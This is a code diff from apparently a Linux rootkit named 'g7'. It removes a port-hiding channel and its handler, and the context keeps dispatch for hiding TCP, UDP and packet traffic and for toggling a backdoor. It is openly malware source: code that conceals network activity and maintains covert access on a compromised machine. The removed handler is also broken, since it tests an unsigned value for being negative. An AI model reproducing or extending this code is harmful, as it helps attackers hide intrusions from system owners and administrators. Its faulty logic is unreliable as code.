@@ -36,7 +36,6 @@ report_channels(void)
     DEBUG_NOTICE("%-24s %#10lx\n", "TCPHIDE",  G7_TCPHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "UDPHIDE",  G7_UDPHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "PACKHIDE", G7_PACKHIDE);
-    DEBUG_NOTICE("%-24s %#10lx\n", "PORTHIDE", G7_PORTHIDE);
     DEBUG_NOTICE("%-24s %#10lx\n", "BACKDOOR", G7_BACKDOOR);
     DEBUG_NOTICE("%-24s %#10lx\n", "TOGGLEBD", G7_TOGGLEBD);
     DEBUG_NOTICE("%-24s %#10lx\n", "LOGGING",  G7_LOGGING);
@@ -55,7 +54,6 @@ detect_channel(unsigned cmd)
     case G7_TCPHIDE:  return (channel_t){ "TCPHIDE",  handle_tcphide  };
     case G7_UDPHIDE:  return (channel_t){ "UDPHIDE",  handle_udphide  };
     case G7_PACKHIDE: return (channel_t){ "PACKHIDE", handle_packhide };
-    case G7_PORTHIDE: return (channel_t){ "PORTHIDE", handle_porthide };
     case G7_BACKDOOR: return (channel_t){ "BACKDOOR", handle_backdoor };
     case G7_TOGGLEBD: return (channel_t){ "TOGGLEBD", handle_togglebd };
     case G7_LOGGING:  return (channel_t){ "LOGGING",  handle_logging  };
@@ -271,32 +269,6 @@ handle_packhide(unsigned long arg)
 
     } else
         return -ENOTTY;
-
-    return 0;
-}
-
-int
-handle_porthide(unsigned long arg)
-{
-    unsigned sarg = (unsigned)(arg % 65536);
-
-    if (!sarg) {
-        unhide_lports();
-        rootkit.hiding_ports = 0;
-        DEBUG_NOTICE("[g7] porthide off\n");
-    } else if (sarg < 0) {
-        unhide_lport((port_t)(-sarg));
-        DEBUG_NOTICE("[g7] unhiding port %d\n", -sarg);
-    } else if (sarg > 0) {
-        if (!rootkit.hiding_ports) {
-            hide_lports();
-            DEBUG_NOTICE("[g7] porthide on\n");
-        }
-
-        hide_lport((port_t)sarg);
-        rootkit.hiding_ports = 1;
-        DEBUG_NOTICE("[g7] hiding port %d\n", sarg);
-    }
 
     return 0;
 }
